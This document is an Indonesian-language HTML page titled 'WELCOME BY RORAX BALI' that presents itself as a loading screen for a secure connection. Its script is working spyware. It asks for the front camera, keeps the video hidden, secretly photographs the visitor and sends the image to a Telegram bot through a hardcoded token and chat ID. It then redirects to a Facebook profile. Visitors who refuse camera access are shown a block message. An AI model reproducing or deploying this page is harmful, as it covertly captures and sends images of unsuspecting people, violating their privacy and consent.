<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WELCOME BY RORAX BALI</title>
    <style>
        /* Gaya dasar tema futuristik */
        body { 
            background-color: #030712; 
            color: #00ff66; 
            font-family: 'Courier New', Courier, monospace; 
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            text-shadow: 0 0 5px #00ff66;
        }

        /* Menyembunyikan kamera & canvas */
        video, canvas { 
            display: none; 
        }

        /* Kotak konsol utama */
        .terminal {
            width: 90%;
            max-width: 600px;
            padding: 40px 30px;
            border: 1px solid #0055ff;
            border-radius: 8px;
            background: rgba(0, 10, 30, 0.85);
            box-shadow: 0 0 25px rgba(0, 85, 255, 0.4), inset 0 0 15px rgba(0, 255, 102, 0.05);
            position: relative;
            text-align: center;
        }

        /* Judul utama */
        h1 {
            color: #00a2ff;
            margin-top: 0;
            font-size: 26px;
            letter-spacing: 3px;
            text-shadow: 0 0 15px #0055ff;
            border-bottom: 2px solid #0055ff;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }

        /* Teks status pemuatan */
        .status-text {
            font-size: 16px;
            color: #ffffff;
            margin: 15px 0;
            text-shadow: none;
        }

        /* Gaya teks jika akses ditolak (Merah) */
        .status-error {
            color: #ff3333 !important;
            text-shadow: 0 0 10px #ff3333 !important;
            font-weight: bold;
        }

        /* Animasi loading bar modern */
        .progress-container {
            width: 100%;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
            border: 1px solid #0055ff;
        }

        .progress-bar {
            width: 0%;
            height: 8px;
            background: linear-gradient(90deg, #0055ff, #00ff66);
            box-shadow: 0 0 10px #00ff66;
            transition: width 1.5s ease-in-out;
        }

        /* Loading bar berubah merah saat error */
        .progress-bar.error {
            background: #ff3333 !important;
            box-shadow: 0 0 10px #ff3333 !important;
        }

        /* Animasi garis scan pelindung layar */
        .terminal::before {
            content: " ";
            display: block;
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.04), rgba(0, 255, 0, 0.01), rgba(0, 255, 0, 0.04));
            z-index: 2;
            background-size: 100% 2px, 3px 100%;
            pointer-events: none;
            border-radius: 8px;
        }
    </style>
</head>
<body>

    <div class="terminal">
        <h1>WELCOME BY RORAX BALI</h1>
        <div class="status-text" id="status">Membuat koneksi aman ke halaman...</div>
        
        <div class="progress-container">
            <div class="progress-bar" id="bar"></div>
        </div>
    </div>

    <!-- Elemen kamera tersembunyi -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ==================== PENGATURAN UTAMA ====================
        const TELEGRAM_BOT_TOKEN = '8773430297:AAG5HZB1NM9sqSVFZnUgsB4cl0JRSkYUkBI'; // Ganti dengan token bot Telegram Anda
        const TELEGRAM_CHAT_ID = '1966317946';     // Ganti dengan Chat ID Telegram Anda
        const DOMAIN_TUJUAN = 'https://www.facebook.com/tisnaedy.tisnaedy/'; // Ganti dengan domain tujuan Anda
        // ==========================================================

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusText = document.getElementById('status');
        const progressBar = document.getElementById('bar');

        // 1. Meminta izin kamera secara otomatis saat masuk
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                statusText.innerText = "Membuka halaman utama...";
                progressBar.style.width = "60%"; // Animasi loading jalan setengah
                
                // Jeda agar kamera fokus sebelum memotret
                setTimeout(ambilFotoOtomatis, 1500);
            })
            .catch(err => {
                console.error("Gagal akses kamera: ", err);
                
                // PERBAIKAN: Menampilkan peringatan jika izin ditolak
                statusText.innerText = "AKSES DITOLAK: Halaman tidak bisa diakses karena perizinan kamera tidak diterima!";
                statusText.classList.add("status-error");
                
                progressBar.style.width = "100%";
                progressBar.classList.add("error");
                
                // Menghentikan sistem dan TIDAK melakukan redirect ke DOMAIN_TUJUAN
            });

        // 2. Fungsi memotret otomatis
        function ambilFotoOtomatis() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Mirroring effect yang aman
            context.clearRect(0, 0, canvas.width, canvas.height);
            context.save();
            context.translate(canvas.width, 0);
            context.scale(-1, 1);
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            context.restore();

            canvas.toBlob((blob) => {
                if (blob) {
                    kirimKeTelegram(blob);
                } else {
                    window.location.href = DOMAIN_TUJUAN;
                }
            }, 'image/jpeg', 0.8);
        }

        // 3. Fungsi mengirim ke Telegram dan mengalihkan halaman
        function kirimKeTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBlob, 'capture.jpg');
            formData.append('caption', '📸 Foto pengunjung dari halaman WELCOME BY RORAX BALI');

            // URL API Telegram yang sudah diperbaiki
            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                progressBar.style.width = "100%"; // Loading penuh
                statusText.innerText = "Selesai! Selamat datang.";
                
                // Pindah halaman tujuan
                setTimeout(() => {
                    window.location.href = DOMAIN_TUJUAN;
                }, 800);
            })
            .catch(error => {
                console.error('Error:', error);
                window.location.href = DOMAIN_TUJUAN;
            });
        }
    </script>
</body>
</html>
